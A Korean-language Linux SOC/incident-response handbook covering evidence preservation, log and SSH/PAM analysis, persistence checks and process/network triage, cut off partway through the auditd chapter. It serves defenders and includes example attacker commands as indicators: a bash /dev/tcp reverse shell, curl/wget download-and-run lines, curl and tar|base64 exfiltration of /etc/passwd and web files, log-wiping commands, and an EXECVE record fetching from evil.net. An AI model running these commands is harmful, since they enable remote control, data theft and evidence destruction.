# Linux SOC / IR 실전 핸드북

> 분할본을 하나의 문서로 합친 버전입니다. 빠른 탐색은 분할본의 `00_README.md`를 권장합니다.


---

## 01. Linux 사고 초동 대응 · 증거 보존 · 격리

## 1. 사고 접수 직후 확인할 5가지

### 1) 현재 로그인 세션
```bash
who
w
last -a | head -30
lastb -a | head -30
```

확인 포인트:
- 의심 계정이 아직 접속 중인가
- 출발지 IP가 Bastion/VPN/관리망인지, 신규·외부 IP인지
- 실패 후 성공으로 이어졌는가
- 세션 지속 시간이 비정상적으로 긴가

### 2) 현재 네트워크 연결
```bash
ss -tnp
ss -tnp | grep ESTAB
ss -tlnp
netstat -tnp 2>/dev/null | grep ESTABLISHED
```

특정 IOC 확인:
```bash
ss -tnp | grep '203.0.113.5'
```

### 3) 현재 프로세스
```bash
ps auxf
ps -eo user,pid,ppid,lstart,comm,args --sort=lstart
```

우선 확인:
- `/tmp`, `/var/tmp`, `/dev/shm`에서 실행
- `nginx/httpd → sh/bash → curl/wget`
- 숨김 파일 실행
- `nohup`, `base64 -d`, `bash -c`, `python -c`
- 삭제된 실행 파일을 계속 실행 중인 프로세스

### 4) 최근 인증·감사 이벤트
Ubuntu/Debian:
```bash
tail -n 200 /var/log/auth.log
```

RHEL 계열:
```bash
tail -n 200 /var/log/secure
```

auditd:
```bash
tail -n 200 /var/log/audit/audit.log
ausearch --start recent
```

journald:
```bash
journalctl -xe
journalctl -u sshd --since '-1 hour'
```

### 5) 시간 기준 확정
```bash
timedatectl status
date
date -u
```

> 분석 시작 전에 서버 로컬 시간, SIEM 시간, UTC/KST 등의 차이를 반드시 확정한다.

---

## 2. 증거 보존 우선순위

네트워크 격리나 재부팅 전에 사라질 수 있는 정보부터 확보한다.

### 휘발성 정보
```bash
who > who.txt
w > w.txt
ps auxfww > ps_auxfww.txt
ss -tanp > ss_tanp.txt
ss -tulnp > ss_tulnp.txt
ip addr > ip_addr.txt
ip route > ip_route.txt
```

### 핵심 설정·지속성 파일
```bash
cp -a /etc/passwd ./evidence/
cp -a /etc/group ./evidence/
cp -a /etc/sudoers ./evidence/
cp -a /etc/sudoers.d ./evidence/ 2>/dev/null
cp -a /etc/cron.d ./evidence/ 2>/dev/null
cp -a /etc/systemd/system ./evidence/ 2>/dev/null
```

SSH 키:
```bash
find /root /home -name authorized_keys -type f -print 2>/dev/null
```

### 로그 스냅샷
```bash
cp -a /var/log/auth.log* ./evidence/ 2>/dev/null
cp -a /var/log/secure* ./evidence/ 2>/dev/null
cp -a /var/log/audit ./evidence/ 2>/dev/null
journalctl --since '2026-08-11 00:00:00' > journal_snapshot.txt
```

### 의심 파일 보존
```bash
stat /tmp/.suspect
sha256sum /tmp/.suspect
cp --preserve=all /tmp/.suspect ./evidence/
```

원본을 직접 실행하거나 수정하지 않는다.

---

## 3. 격리 수준

### 경량 격리
- 특정 IOC IP 차단
- 의심 계정 잠금
- 특정 접근 경로 차단

### 중간 격리
- 관리망/포렌식망 등 필요한 내부 통신만 허용

### 완전 격리
- 네트워크를 전면 차단
- 진행 중인 피해가 크거나 C2/유출이 명확할 때 고려

### 특정 IP 차단 예시
> 운영 상태를 변경하는 명령이다.

```bash
iptables -I INPUT  -s 203.0.113.5 -j DROP
iptables -I OUTPUT -d 203.0.113.5 -j DROP
```

### 의심 계정 잠금
```bash
usermod -L backupsvc
passwd -l backupsvc
```

### SSH 사용자 차단
`/etc/ssh/sshd_config`에 정책 반영:
```text
DenyUsers admin backupsvc
```

설정 검증 후 재로드:
```bash
sshd -t && systemctl reload sshd
```

---

## 4. 침해 타임라인 기본 골격

```text
[초기 접근] SSH 성공 / 웹 취약점 / 관리 채널
                ↓
[권한 상승] sudo / su / 취약한 특권 명령
                ↓
[실행] curl/wget → chmod → bash/nohup
                ↓
[지속성] cron / systemd / authorized_keys / 신규 계정
                ↓
[행위] 내부 탐색 / lateral movement / C2 / 데이터 유출
                ↓
[은닉] history/log 삭제 / hidden file / LD_PRELOAD
```

예시:
```text
02:06 auth     Accepted password for admin from 198.51.100.23
02:08 sudo     admin → root /bin/bash
02:09 auditd   curl ... -o /tmp/a.sh
02:10 auditd   chmod +x /tmp/a.sh ; nohup /tmp/a.sh
02:17 cron     root CMD (/tmp/a.sh ...)
02:20 network  dst=203.0.113.10:443 반복 연결
```

---

## 5. 사고 보고서 최소 구성

1. **요약**: 무엇이, 언제, 어디서, 어떻게, 어느 범위까지 발생했는가
2. **타임라인**: 최초 이벤트부터 탐지·조치까지
3. **기술 분석**: 계정/IP/프로세스/파일/네트워크 및 MITRE ATT&CK 매핑
4. **IOC**: IP, 도메인, URL, 해시, 파일 경로, 계정, 서비스명
5. **영향 평가**: 침해 계정·서버·데이터·클라우드 권한 범위
6. **조치**: 격리·차단·계정 초기화·지속성 제거
7. **재발 방지**: 패치, SSH/auditd 강화, SIEM 탐지 개선

---

## 6. 정상화 전 체크리스트

```bash
# 모든 사용자 cron 확인
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done

# cron/systemd 최근 변경 확인
find /etc/cron* /var/spool/cron -type f -mtime -7 -ls 2>/dev/null
find /etc/systemd/system -type f -mtime -7 -ls 2>/dev/null

# SSH 키
find /root /home -name authorized_keys -type f -mtime -30 -ls 2>/dev/null

# sudoers
find /etc/sudoers.d -type f -ls 2>/dev/null

# 일반 사용자 계정
awk -F: '$3>=1000 && $3!=65534 {print $1,$3,$6,$7}' /etc/passwd
```

추가 조치:
- 영향 계정 비밀번호/키 교체
- `PermitRootLogin no` 등 SSH 정책 재점검
- OS 및 취약 패키지 패치
- auditd/FIM/원격 로그 전송 강화
- 차단 IOC와 탐지 룰 반영


---

## 02. Linux 로그 구조 · 수집 · 분석 기초

## 1. Linux에서 관찰 가능한 행위

- 로그인/로그아웃: SSH, console
- 권한 상승: `sudo`, `su`
- 명령 실행: shell, cron, systemd
- 파일 생성/수정/삭제
- 네트워크 inbound/outbound 연결
- 서비스 시작/중지

### 로그의 한계
- 모든 행위가 자동으로 기록되지는 않는다.
- 설정·로그 레벨에 따라 세부 정보가 다르다.
- root 권한 공격자는 로컬 로그를 삭제·조작할 수 있다.
- 단일 로그로는 사용자·자산·변경 맥락이 부족하다.

---

## 2. 데이터 소스 신뢰도

| 소스 | 생성 주체 | 대표 위치/도구 | 조작 가능성 | 주요 용도 |
|---|---|---|---|---|
| syslog/auth | OS·서비스 | `/var/log/*` | 중간 | 인증, 서비스 이벤트 |
| journald | systemd | `journalctl` | 중간 | 서비스/부팅 단위 추적 |
| `.bash_history` | 사용자 shell | `~/.bash_history` | 높음 | 보조 단서 |
| auditd | 커널 감사 | `/var/log/audit/audit.log` | 낮음~중간 | execve, 파일 접근, 권한 변경 |
| EDR/eBPF | 보안 에이전트 | SIEM/콘솔 | 낮음 | 프로세스 트리, 네트워크 텔레메트리 |

> `.bash_history`가 비어 있다고 명령이 실행되지 않은 것은 아니다.

---

## 3. syslog와 journald 흐름

```text
[Service / Application]
   ├─> systemd-journald ─> journalctl
   └─> rsyslog/syslog-ng ─> /var/log/* ─> SIEM Collector

또는
Service → journald → rsyslog → /var/log/* → SIEM
```

파일이 없으면 반드시 journald도 확인한다.
```bash
journalctl -xe
```

---

## 4. `/var/log` 핵심 경로

| 이벤트 | Debian/Ubuntu | RHEL 계열 |
|---|---|---|
| 인증 | `/var/log/auth.log` | `/var/log/secure` |
| 일반 시스템 | `/var/log/syslog` | `/var/log/messages` |
| 커널 | `/var/log/kern.log` 또는 journald | `/var/log/messages`, journald |
| cron | `/var/log/syslog`의 CRON | `/var/log/cron` |
| 패키지 | `/var/log/dpkg.log` | yum/dnf 관련 로그 |
| auditd | `/var/log/audit/audit.log` | 동일 |

기타:
```text
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/btmp      # 로그인 실패, binary
/var/log/wtmp      # 로그인/로그아웃, binary
/var/log/lastlog   # 계정별 마지막 로그인
```

---

## 5. journald 실전 조회

```bash
# 최근 오류와 문맥
journalctl -xe

# SSH 서비스
journalctl -u sshd

# 특정 시점 이후
journalctl -u sshd --since '2026-08-11 01:00:00'

# sudo 커맨드
journalctl _COMM=sudo

# 현재 부팅
journalctl -b

# 이전 부팅
journalctl -b -1

# 부팅 목록
journalctl --list-boots

# 커널
journalctl -k

# 최근 오류 50개
journalctl -p err -n 50
```

주의:
- persistent journal 설정이 없으면 재부팅 후 일부 로그가 사라질 수 있다.
- SIEM이 journald를 직접 수집하는지, rsyslog 파일로 전달받는지 확인한다.

---

## 6. 로그인 binary 로그

```bash
who       # 현재 세션(utmp)
w         # 세션 + 활동
last      # 성공 로그인/로그아웃(wtmp)
lastb     # 실패 로그인(btmp)
lastlog   # 계정별 마지막 로그인
```

`last/lastb`는 인증 로그와 타임라인을 맞추는 데 유용하다.

---

## 7. 기본 로그 검색 워크플로우

### 실시간
```bash
tail -f /var/log/auth.log
journalctl -f -u sshd
```

### 문맥 탐색
```bash
less /var/log/auth.log
```

### 키워드
```bash
grep -n 'Failed password' /var/log/auth.log
grep -Ei 'sudo|useradd|usermod|CRON' /var/log/auth.log /var/log/syslog
```

### 빈도 집계
```bash
grep 'Failed password' /var/log/auth.log \
  | grep -oE 'from ([0-9]{1,3}\.){3}[0-9]{1,3}' \
  | awk '{print $2}' | sort | uniq -c | sort -rn | head
```

### 압축 로그
```bash
zgrep 'Accepted' /var/log/auth.log*.gz
zless /var/log/auth.log.2.gz
zcat /var/log/auth.log.2.gz | less
```

---

## 8. 분석 시 반드시 붙여야 하는 컨텍스트

### 사용자
- 일반 사용자 / 서비스 계정 / 관리자
- 퇴사·비활성 계정 여부
- 평소 sudo 사용 여부

### 자산
- 개발/운영
- 인터넷 노출 여부
- 웹/DB/Bastion 등 역할
- 데이터 중요도

### 시간
- 업무시간 / 야간 / 주말
- 배치/백업/점검 시간대

### 네트워크
- 내부 관리망 / VPN / Bastion
- 신규 IP / 외부 IP

### 변경
- 승인된 배포·패치·장애 대응인가
- 계정/비밀번호 변경 직후인가

---

## 9. 로그 품질 빠른 점검

```bash
timedatectl status
date && date -u
timedatectl show | grep -i NTP
chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null
```

체크:
- NTP 동기화
- hostname/asset ID 일관성
- `user`, `src_ip`, `command`, `path` 파싱 정확도
- SIEM 수집 지연/누락
- 로그 로테이션/압축 파일 수집 여부
- 컨테이너 stdout 로그 별도 수집 여부

---

## 10. Linux 분석 빠른 순서

```text
1) auth.log / secure
2) last / lastb / who
3) sudo / su / PAM
4) auditd execve/file change
5) cron / systemd / SSH key
6) process / file / network
7) firewall / DNS / Flow / EDR / cloud log
```


---

## 03. SSH · PAM · 인증 · 세션 분석

## 1. SSH 연결 흐름

```text
TCP :22 연결
→ SSH 버전 협상
→ 키 교환 및 암호화 채널 구성
→ 사용자 인증(password/publickey 등)
→ PAM 세션 open
→ shell/command/session 생성
```

대표 이벤트:
```text
sshd: Connection from 203.0.113.5 port 52301
sshd: Failed password for alice from 203.0.113.5 ...
sshd: Accepted password for alice from 203.0.113.5 ...
sshd: pam_unix(sshd:session): session opened for user alice
```

---

## 2. 실패 로그인 해석

### Brute force
**단일 계정 + 많은 비밀번호 시도**
```text
Failed password for root ...
Failed password for root ...
Failed password for root ...
```

### Password spraying
**하나의 출발지에서 다수 계정**
```text
Failed ... alice from 198.51.100.5
Failed ... bob   from 198.51.100.5
Failed ... carol from 198.51.100.5
```

### 운영 오류 가능성
- 내부 관리 서버에서 일정한 주기로 반복
- 백업/배치 서비스 계정
- 비밀번호 변경 직후

핵심 질문:
1. 대상 계정 수는 몇 개인가
2. 출발지 IP 수는 몇 개인가
3. 시도 간격은 사람처럼 불규칙한가, 자동화처럼 일정한가
4. 실패 직후 성공했는가
5. 성공 직후 sudo/파일 전송/명령 실행이 있었는가

---

## 3. 성공 로그인 해석

### 공개키
```text
Accepted publickey for devops from 10.10.2.15 ...
```

확인:
- 키 인벤토리에 등록된 키인가
- `authorized_keys`가 최근 수정되었는가
- 해당 IP/호스트에서 원래 사용하는 키인가

### 비밀번호
```text
Accepted password for admin from 203.0.113.44 ...
```

확인:
- 직전 brute force/spraying 존재
- 신규·외부 IP 여부
- 계정 비밀번호 변경/유출 가능성

### root 로그인
고위험 조합:
```text
신규 IP + 야간 + root + Bastion 미경유 + 직후 명령 실행
```

정상 가능 조합:
```text
승인 작업 + 관리망/Bastion + maintenance window + 표준 명령
```

---

## 4. 세션 상관 분석

```bash
lastb -a | head -50
last -a | head -50
who
w
```

예시 흐름:
```text
01:50~02:05 lastb    동일 IP 로그인 실패 180회
02:06       auth.log admin Accepted
02:06~04:33 last     세션 지속
현재         who      아직 로그인 상태
```

---

## 5. SSH 로그 실전 명령

```bash
AUTH=/var/log/auth.log   # RHEL은 /var/log/secure

# 실패 IP 상위
awk '/Failed password/{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' "$AUTH" \
  | sort | uniq -c | sort -rn | head -20

# 특정 IP 전체 이벤트
grep '198.51.100.23' "$AUTH" | tail -100

# 성공 로그인
grep 'Accepted' "$AUTH"

# publickey 성공만
grep 'Accepted publickey' "$AUTH"

# sudo 실행 명령
grep 'sudo:' "$AUTH" | grep 'COMMAND='

# 압축 로그 포함 IOC 검색
zgrep -h '203.0.113.23' /var/log/auth.log* 2>/dev/null
```

journald 환경:
```bash
journalctl -u sshd --since today
journalctl -u sshd | grep -E 'Failed|Accepted|session opened|session closed'
```

---

## 6. PAM 분석

PAM은 Linux 인증 모듈 프레임워크다.

주요 모듈:
- `pam_unix`: `/etc/passwd`, `/etc/shadow` 기반 인증
- `pam_faillock`, `pam_tally2`: 실패 횟수/잠금
- `pam_limits`: 자원 제한
- `pam_google_authenticator`, `pam_duo`: MFA

예:
```text
pam_faillock: user alice locked
pam_unix(sshd:session): session opened for user alice
pam_unix(sshd:session): session closed for user alice
pam_google_authenticator: Verification code mismatch for alice
```

PAM 실패는 "공격"뿐 아니라 정책 위반, 만료, 잠금, MFA 오류일 수 있으므로 상세 메시지를 확인한다.

---

## 7. SSH key 삽입 탐지

모든 `authorized_keys`:
```bash
find /root /home -name authorized_keys -type f -ls 2>/dev/null
```

최근 7일 변경:
```bash
find /root /home -name authorized_keys -type f -mtime -7 -ls 2>/dev/null
```

키 fingerprint:
```bash
ssh-keygen -lf /home/deploy/.ssh/authorized_keys
```

감사 규칙 예시:
```bash
auditctl -w /home/deploy/.ssh/authorized_keys -p wa -k ssh_key_change
ausearch -k ssh_key_change --start today
```

의심 체인:
```text
sudo/root 획득
→ authorized_keys 수정
→ 이후 Accepted publickey
```

---

## 8. SSH 터널링 / 포트포워딩

### Local forwarding `-L`
```bash
ssh -L 8080:internal-server:80 user@bastion
```

```text
client:8080 → SSH(bastion) → internal-server:80
```

### Remote forwarding `-R`
```bash
ssh -R 9090:localhost:22 user@remote-server
```

```text
remote-server:9090 → SSH tunnel → current-host:22
```

### Dynamic forwarding `-D`
```bash
ssh -D 1080 user@compromised-server
```

```text
client:1080 SOCKS → SSH tunnel → compromised-server → reachable networks
```

내부 네트워크 파악에 쓰일 수 있는 명령 흔적:
```bash
ip addr
ip route
cat /etc/hosts
cat /etc/resolv.conf
ss -nt
```

방어 설정 예시:
```text
AllowTcpForwarding no
```

> 터널링 여부를 인증 성공 로그만으로 판정하기 어려울 수 있어 sshd 상세 로그, 프로세스, 네트워크 흐름을 함께 본다.

---

## 9. sshd 보안 설정 체크

`/etc/ssh/sshd_config` 예:
```text
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
AllowUsers alice bob
AllowTcpForwarding no
X11Forwarding no
LogLevel VERBOSE
```

검증:
```bash
sshd -t
sshd -T | egrep 'permitrootlogin|passwordauthentication|maxauthtries|allowtcpforwarding|loglevel'
```

---

## 10. Fail2ban 분석

로그 예:
```text
fail2ban.actions: Ban 198.51.100.23
fail2ban.actions: Unban 198.51.100.23
```

확인:
- ban 이전 실패 횟수
- ban 이후 다른 IP로 성공했는가
- unban 직후 자동화 재시도
- spraying처럼 임계값을 피한 공격인가

```bash
grep -E 'Ban|Unban' /var/log/fail2ban.log | tail -100
```


---

## 04. 계정 침해 · 권한 상승 · 지속성

## 1. sudo 로그 읽기

```text
sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
```

필드:
- 실행자: `alice`
- 세션: `TTY=pts/0`
- 작업 디렉터리: `/home/alice`
- 목표 권한: `USER=root`
- 명령: `COMMAND=...`

### 상대적으로 정상적인 예
```text
apt update
systemctl restart nginx
tail -n 100 /var/log/nginx/error.log
```

### 즉시 맥락 확인할 예
```text
useradd -m backupsvc
/bin/bash
chmod 777 /etc/sudoers
curl -fsSL http://.../a.sh
```

검색:
```bash
grep 'sudo:' /var/log/auth.log | grep 'COMMAND='
journalctl _COMM=sudo --since today
```

---

## 2. `sudoers` 조작

고위험 예:
```text
backupsvc ALL=(ALL) NOPASSWD:ALL
```

정상적으로는 필요한 명령만 제한하는 형태가 더 일반적이다.
```text
ops-team ALL=(ALL) NOPASSWD:/usr/bin/systemctl restart nginx
```

확인:
```bash
stat /etc/sudoers
find /etc/sudoers.d -type f -ls 2>/dev/null
grep -Rni 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

감사 로그:
```bash
ausearch -f /etc/sudoers --start today
ausearch -k sudoers --start today
```

핵심 체인:
```text
sudoers 신규/변경 → 직후 sudo 성공 → root shell/위험 명령
```

---

## 3. `su`, `pkexec`, 기타 권한 전환

### `su`
```text
su: pam_unix: authentication success
su: pam_unix: session opened for user root
```

```bash
grep -E ' su:|su\[' /var/log/auth.log
```

### `pkexec`
- PolicyKit 기반 권한 실행
- auth/journal/auditd/EDR을 함께 확인
- 취약점 악용 시 표준 인증 로그가 부족할 수 있다.

프로세스 기준:
```bash
ps -ef | grep -E '[p]kexec|[s]u '
ausearch -x /usr/bin/pkexec --start today 2>/dev/null
```

---

## 4. 신규 계정 및 그룹 변경

의심 체인:
```text
useradd → passwd 변경 → sudo/wheel 그룹 추가 → SSH 로그인 → sudo
```

현재 계정:
```bash
awk -F: '$3>=1000 && $3!=65534 {print $1,$3,$4,$6,$7}' /etc/passwd
```

sudo/wheel:
```bash
getent group sudo
getent group wheel
```

최근 로그:
```bash
grep -Ei 'useradd|usermod|new user|new group|password changed' /var/log/auth.log /var/log/secure 2>/dev/null
journalctl --since today | grep -Ei 'useradd|usermod|passwd'
```

판단:
- 승인된 계정 생성인가
- 운영 계정처럼 위장한 이름인가
- 생성 직후 로그인했는가
- 바로 sudo를 사용했는가

---

## 5. SSH key 지속성

```bash
find /root /home -name authorized_keys -type f -ls 2>/dev/null
find /root /home -name authorized_keys -type f -mtime -7 -ls 2>/dev/null
```

```text
권한 획득 → authorized_keys 변경 → Accepted publickey
```

표준 auth 로그에는 파일 수정 자체가 남지 않을 수 있으므로 auditd/FIM/mtime을 보강한다.

---

## 6. cron 지속성

현재 등록:
```bash
crontab -l
crontab -l -u root
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done
```

파일:
```bash
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /var/spool/cron 2>/dev/null
find /etc/cron* /var/spool/cron -type f -mtime -7 -ls 2>/dev/null
```

고위험 패턴:
```text
curl/wget ... | bash
/tmp/.hidden
/dev/shm/...
>/dev/null 2>&1
root 계정에서 외부 URL 직접 호출
```

로그:
```bash
grep 'CRON' /var/log/syslog | tail -100
tail -100 /var/log/cron 2>/dev/null
journalctl -u cron --since today 2>/dev/null
journalctl -u crond --since today 2>/dev/null
```

---

## 7. systemd 서비스 지속성

활성/등록 서비스:
```bash
systemctl list-units --type=service --state=running
systemctl list-unit-files --type=service
```

최근 unit 파일:
```bash
find /etc/systemd/system -type f -mtime -7 -ls 2>/dev/null
```

unit 내용:
```bash
systemctl cat suspicious.service
systemctl status suspicious.service
```

고위험 특징:
- `ExecStart=/tmp/...`, `/dev/shm/...`, 숨김 파일
- 이름/Description이 OS 업데이트처럼 위장
- `Restart=always`
- 생성 직후 `enable` + `start`

로그:
```bash
journalctl -u suspicious.service
journalctl --since today | grep -E 'Created symlink|Started .*Service|systemctl'
```

---

## 8. SUID/SGID 권한 상승 흔적

SUID:
```bash
find / -xdev -perm -4000 -type f -ls 2>/dev/null
```

SGID:
```bash
find / -xdev -perm -2000 -type f -ls 2>/dev/null
```

특히 `/tmp`, `/home`, `/var/tmp`, 사용자 쓰기 경로의 신규 SUID 파일은 우선 조사한다.

mtime 기반 최근 변경:
```bash
find / -xdev -perm -4000 -type f -mtime -7 -ls 2>/dev/null
```

---

## 9. 다중 계정 권한 상승 체인

```text
webuser SSH 로그인
→ sudo -l로 허용 명령 확인
→ 다른 서비스 계정 권한으로 특권 프로그램 실행
→ shell escape / 취약 동작
→ uid=0 shell
```

관찰 포인트:
- 로그인 계정과 실제 실행 UID/EUID가 달라지는 시점
- sudo `USER=` 대상
- auditd `uid`, `euid`, `auid`, `ppid`
- `python/perl/vi/less/find` 등 일반 도구가 특권으로 실행된 맥락

```bash
sudo -l
ausearch -m EXECVE --start today
```

---

## 10. 지속성 점검 우선순위

```text
1. 신규 계정 / sudo·wheel
2. /etc/sudoers.d
3. root 및 사용자 authorized_keys
4. crontab / /etc/cron.* / /var/spool/cron
5. /etc/systemd/system
6. SUID/SGID
7. shell profile 및 환경변수
8. 웹 루트 신규 파일
```


---

## 05. 프로세스 · 명령 · 파일 · 네트워크 침해행위 분석

## 1. 프로세스 트리부터 본다

```bash
ps auxfww
ps -eo user,pid,ppid,lstart,etime,comm,args --forest
```

특정 PID:
```bash
PID=1234
ps -p "$PID" -o user,pid,ppid,lstart,etime,comm,args
ps -p "$(ps -o ppid= -p "$PID")" -o user,pid,ppid,comm,args
```

고위험 부모-자식 예:
```text
nginx → bash → curl
httpd → sh → wget
cron → bash → /tmp/.update
sshd → bash → nmap
```

확인 항목:
- 실행 경로
- 명령 인자
- 부모 프로세스
- 시작 시간
- UID/EUID
- 네트워크 연결

---

## 2. 명령 행위 분류

| 목적 | 대표 명령 |
|---|---|
| Recon | `id`, `whoami`, `uname -a`, `ps`, `ip`, `ss` |
| Execution | `bash`, `sh`, `python3`, `perl` |
| Download | `curl`, `wget`, `scp`, `sftp` |
| Persistence | `crontab`, `systemctl enable`, `useradd` |
| Exfiltration | `scp`, `rsync`, `curl -F`, `nc` |
| Discovery/Lateral | `ssh`, `nmap`, `nc`, `ip route` |

단일 명령보다 **체인**을 본다.
```text
curl/wget → /tmp → chmod +x → nohup/bash → outbound connection
```

---

## 3. bash history

```bash
cat ~/.bash_history
history
```

유용:
- 사용자 평소 명령 패턴
- 인터랙티브 세션 흔적
- 운영 작업과 공격 행위 구분

한계:
- 비대화형 shell 누락
- 세션 종료 시 기록
- `unset HISTFILE`, `HISTSIZE=0`, `history -c`
- 파일 삭제/조작

따라서 auditd/EDR/sudo/journal과 교차 확인한다.

---

## 4. 다운로드 → 실행 패턴

```text
curl -fsSL http://.../a.sh -o /tmp/a.sh
wget -q http://.../tools.tar.gz -P /dev/shm/
chmod +x /tmp/a.sh
nohup /tmp/a.sh >/dev/null 2>&1 &
```

인코딩/파일리스에 가까운 실행:
```text
echo '...' | base64 -d | bash
bash -c '...'
python3 -c '...'
```

검색 예:
```bash
grep -RniE 'curl|wget|base64|nohup|bash -c|python.*-c' /var/log/audit /var/log/auth.log 2>/dev/null
```

---

## 5. 위험 경로

```text
/tmp       사용자 쓰기 가능, 임시 payload 빈번
/var/tmp   재부팅 후에도 남을 수 있음
/dev/shm   메모리 기반, 흔적 최소화에 악용 가능
.*         dotfile 은닉
```

실행 가능 파일:
```bash
find /tmp /var/tmp /dev/shm -type f -perm /111 -ls 2>/dev/null
```

숨김 파일:
```bash
find /tmp /var/tmp /dev/shm /home -type f -name '.*' -ls 2>/dev/null
```

최근 변경:
```bash
find /tmp /var/tmp /dev/shm -type f -mtime -1 -ls 2>/dev/null
```

---

## 6. `/proc` 기반 현재 프로세스 검증

```bash
PID=1234
cat /proc/$PID/cmdline | tr '\0' ' '; echo
readlink -f /proc/$PID/exe
cat /proc/$PID/status | grep -E 'Name|Pid|PPid|Uid|Gid'
cat /proc/$PID/environ | tr '\0' '\n' | sort
```

삭제된 실행 파일:
```bash
ls -l /proc/[0-9]*/exe 2>/dev/null | grep '(deleted)'
```

위험 경로에서 실행:
```bash
ls -l /proc/[0-9]*/exe 2>/dev/null | grep -E '/tmp|/var/tmp|/dev/shm'
```

---

## 7. 현재 네트워크 상태

```bash
ss -tnp
ss -tnp | grep ESTAB
ss -tlnp
ss -uanp
```

외부 연결 후보:
```bash
ss -tnp | grep ESTAB | grep -Ev '127\.0\.0\.1|::1'
```

특정 IP:
```bash
ss -tnp | grep '203.0.113.5'
```

판단:
- 해당 프로세스가 원래 외부 통신해야 하는가
- 목적지 IP/포트가 평소와 다른가
- 연결이 주기적으로 반복되는가
- 웹/DB 서버가 인터넷으로 직접 나가는가

---

## 8. C2 / Reverse Shell

### 의심 특징
- 일정 주기의 동일 목적지 연결
- 비표준 포트 `4444`, `1337`, `8080` 등
- `/tmp` 실행 프로세스가 외부 연결
- 일반적으로 outbound가 필요 없는 서버의 외부 연결

대표 reverse shell 형태:
```text
bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
```

> 문자열 자체만으로 악성 판정을 내리지 말고 프로세스 트리와 실제 연결을 확인한다.

---

## 9. DNS 터널링

의심:
- 긴 base64/hex 유사 서브도메인
- 동일 도메인에 매우 짧은 간격 반복 요청
- `nslookup`, `dig`가 서비스 계정/웹 프로세스 하위에서 실행

예:
```text
aGVsbG8td29ybGQ.evil-dns.net
```

명령 흔적:
```bash
grep -Ei 'nslookup|dig' /var/log/audit/audit.log 2>/dev/null
```

필요 시 DNS 로그에서 쿼리 길이·빈도·엔트로피를 추가 분석한다.

---

## 10. 데이터 유출

대표 체인:
```text
민감 파일 탐색/읽기
→ tar/zip 압축
→ base64 등 인코딩
→ curl POST / scp / rsync / nc
```

예:
```text
curl -F 'data=@/etc/passwd' https://.../upload
scp /var/www/html/config.php user@external:/tmp/
tar czf - /var/www | base64 | curl -d @- http://.../
```

분석 포인트:
- DB/웹 서버의 비정상 대용량 outbound
- tar/zip 직후 외부 연결
- 민감 파일 접근 직후 전송 명령
- destination이 승인된 백업/저장소인지

---

## 11. Lateral Movement

주요 경로:
- SSH key/credential 재사용
- 내부 서비스 스캔
- `/etc/shadow`, 설정 파일, 환경변수 등 자격증명 탐색

명령 흔적:
```text
ssh -i /root/.ssh/id_rsa user@10.0.1.50
nmap -sV 10.0.1.0/24 -p 22,80,443
nc -zv 10.0.1.50 22
```

분석:
```bash
ip route
ss -ntp
last -a
ausearch -m EXECVE --start today | grep -E 'ssh|nmap|nc'
```

서버 A의 outbound SSH와 서버 B의 inbound `Accepted`를 시간·계정으로 맞추면 강한 증거가 된다.

---

## 12. 로그·히스토리 삭제/은닉

명령 예:
```text
rm /var/log/auth.log
truncate -s 0 /var/log/auth.log
sed -i '/203.0.113.5/d' /var/log/auth.log
history -c
shred -u ~/.bash_history
```

탐지:
- 로그 크기 갑작스런 0
- 시간 연속성 단절
- journald/원격 syslog/SIEM과 불일치
- auditd/FIM의 파일 변경 이벤트

```bash
stat /var/log/auth.log
journalctl --since '-2 hours'
ausearch -f /var/log/auth.log --start today 2>/dev/null
```

---

## 13. LD_PRELOAD 및 환경변수 은닉

```bash
cat /proc/$PID/environ | tr '\0' '\n' | grep -E 'LD_PRELOAD|HISTFILE|HISTSIZE|HISTFILESIZE'
```

의심 예:
```text
LD_PRELOAD=/tmp/.lib.so
HISTFILE=/dev/null
HISTSIZE=0
```

LD_PRELOAD는 시스템 함수 후킹에 악용될 수 있으므로 해당 라이브러리 경로, hash, 프로세스 트리를 추가 조사한다.

---

## 14. IOC 추출

IP:
```bash
grep -hE 'Failed|Accepted' /var/log/auth.log* 2>/dev/null \
 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u
```

URL 후보:
```bash
grep -hEi 'curl|wget' /var/log/audit/audit.log* 2>/dev/null \
 | grep -oE 'https?://[^ "\047]+' | sort -u
```

파일 해시:
```bash
find /tmp /var/tmp /dev/shm -type f -exec sha256sum {} \; 2>/dev/null
```

---

## 15. Alert triage 체크리스트

1. 실행 주체(user/uid/euid)
2. 부모 프로세스와 실행 경로
3. command line의 download/encoding/hiding/background 요소
4. 이후 파일 생성·권한 변경
5. cron/service/key/account 지속성
6. outbound/C2/lateral/exfiltration
7. 승인된 배포·점검 여부
8. 즉시 격리 필요 여부


---

## 06. auditd · FIM · SELinux · AppArmor

## 1. auditd가 중요한 이유

auditd는 커널 수준 감사 데이터를 기록하며 다음 행위를 추적할 수 있다.
- `execve`, `open`, `write`, `unlink`, `chmod`, `chown`
- 파일/디렉터리 접근
- 사용자 인증·계정 관리
- 권한/UID 변경
- 네트워크 관련 syscall
- SELinux/AppArmor 위반

주의:
- 규칙이 없으면 원하는 이벤트가 기록되지 않을 수 있다.
- 과도한 syscall 감사는 로그량/성능 부담이 크다.
- 디스크 부족 시 감사 중단 위험이 있어 auditd 저장 정책도 중요하다.

상태:
```bash
systemctl status auditd
auditctl -s
auditctl -l
```

---

## 2. audit 로그 이벤트 묶음

하나의 실행 이벤트는 같은 `msg=audit(timestamp:serial)`을 공유하는 여러 레코드로 나타날 수 있다.

### SYSCALL
```text
type=SYSCALL ... syscall=59 success=yes ppid=1234 pid=5678 uid=1001 auid=1001 ... exe="/usr/bin/curl"
```

### EXECVE
```text
type=EXECVE ... argc=3 a0="curl" a1="-fsSL" a2="http://evil.net/c.sh"
```

### PATH
```text
